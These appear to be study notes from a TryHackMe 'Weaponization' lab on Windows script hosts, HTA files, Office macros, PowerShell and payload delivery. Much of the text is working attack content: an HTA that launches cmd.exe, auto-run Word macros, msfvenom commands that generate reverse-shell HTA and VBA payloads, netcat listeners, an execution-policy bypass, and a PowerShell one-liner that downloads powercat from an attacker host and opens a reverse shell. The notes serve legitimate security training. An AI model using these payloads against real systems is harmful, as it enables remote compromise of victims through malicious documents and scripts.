---
title: "Weaponization"
date: 2026-03-25
weight: 1
---

## Windows Script Host (WSH)
- Its a built-in Windows adminstration tool that runs batch files to automate and manage tasks within the OS.
- It is windows native engine, `wscript.exe` (UI scripts) and `cscript.exe` (command line scripts), which are responsible for executing various Microsoft Visual Basic Scripts, including `.vbs` and `.vbe`. 
- Have a look here for more details: [VBScript](https://en.wikipedia.org/wiki/VBScript)
- Have a look at the example:
```vbscript
' This is a simple VBScript that displays a message box with a welcome message.
' wscript.exe example1.vbs
Dim message 
message = "Welcome to THM"
MsgBox message

' This script will open the calculator application when executed.
' wscript.exe example2.vbs
' or if the vbs scripts are blocked, lets use txt files.
' wscript /e:VBScript example3.txt
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```

## An HTML Application (HTA)
- It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered.
- HTAs, which are dynamic `HTML` pages containing Jscript or VBScript. 
```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
- When this file is downloaded and executed in the victim's machine, it will run the command prompt (`cmd.exe`), which can be used to execute further commands.
### Reverse HTA Connection
```bash
# Attacker's machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=443-f hta-psh -o reverse.hta
python3 -m http.server 8000
sudo nc -lvnp 443
# you will get the reverse shell once the victim executes the hta file

# Victim's machine
curl http://<Attacker_IP>:8000/reverse.hta -o reverse.hta
start reverse.hta
```

## Visual Basic for Applications (VBA)
- A programming language by Microsoft for Microsoft applications such as Excel, Word etc.
- VBA programming language allows automating tasks of nearly every keyboard and mouse actions between the user and the applications.
- Macros are MS Office applications that contain embedded VBA code. It used to create custom fucntions to speed up manual tasks by creating automatic processes. Once of VBA's features is accessing the Windows API, and other low level functionality. For more info, visit: [VBA](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications)
- To use macros, Open Word -- New Word Doc (Blank)--> view --> macros --> create new macro --> paste the code below
```vbscript
' run the macro by F5 or Run → Run Sub/UserForm for testing
Sub THM()
  MsgBox ("Welcome to Weaponization Room!")
End Sub
```
- Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as AutoOpen and Document_open. Also replacing the MsgBOx with the payload we want to execute.
```vbscript
Sub Document_Open()
  THM
End Sub
Sub AutoOpen()
  THM
End Sub
Sub THM()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```
- It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as .doc and docm. (Use Word 97-2003 Document while saving..)
- Lets close the Word document, and open it again, you will see the calculator application opened as well.
- We can do the same using Metaisploit framework.
```bash
# Attacker machine
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=443 -f vba -o payload.vba
# here its generates a vba that defaults to Workbook, so we need replace the `Workbook_Open` with `Document_Open` to make suitable for word.
python3 -m http.server 8000
sudo nc -lvnp 443

# Victim machine
curl http://<Attacker_IP>:8000/payload.vba -o payload.vba
# open the payload.vba file, copy the content and paste it in the macro editor of the word document, then save it as Macro-Enabled format and open it again to get the reverse shell.
```


## Powershell
- Powershell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses.
- Lets start by creating a simple script that prints a message.
- Exccution policy: Its a security option to protect system from running malicious scripts. Microsoft disables executing Powershell scripts `.ps1` by default. To get the current execution policy `Get-ExecutionPolicy`.
```powershell
# test.ps1
Write-Host "Hello World"
# execute it
powershell -File test.ps1
# by pass execution policy
powershell -ExecutionPolicy Bypass -File test.ps1

# disable the execution policy for the current session
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser RemoteSigned

# start a process
powershell -Command "Start-Process calc.exe"
```

- Now, lets try to get the reverse shell using the one of tools written in Powersehell `powercat`.
```bash
# Attacker's machine
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8000
nc -lvnp 1337  # Listen to this port 1337, for reverse shell

# Victim's machine
# Downloads the `powercat.ps1` payload, then executes it locally on the target using cmd.exe and sends the connection back to the attacker that is listening on port 1337.
powershell -c "IEX (New-Object System.Net.WebClient).DownloadString('http://<Attacker_IP>:8000/powercat.ps1');powercat -c <Attacker_IP> -p 1337 -e cmd"
```

## Delivery Techniques
### Email Delivery
- More info: [Spearphishing](https://attack.mitre.org/techniques/T1566/001/)
### Web Delivery
- The webserver has to follow security guidelines such as clean record and reputation of its domain name and TLS certificate.
- More info: [T1105](https://attack.mitre.org/techniques/T1105/)
### USB Delivery
- This method requires the victim to plug in the USB physically. This method could be effective and usefull at conferences where the adversary can distribute the USB. 
- For info, see [T1091](https://attack.mitre.org/techniques/T1091/)
- Common USB attacks used to weaponize USB devices include Rubber Ducky, USBHarpoon, charging USB cable, such as O.MG Cable.













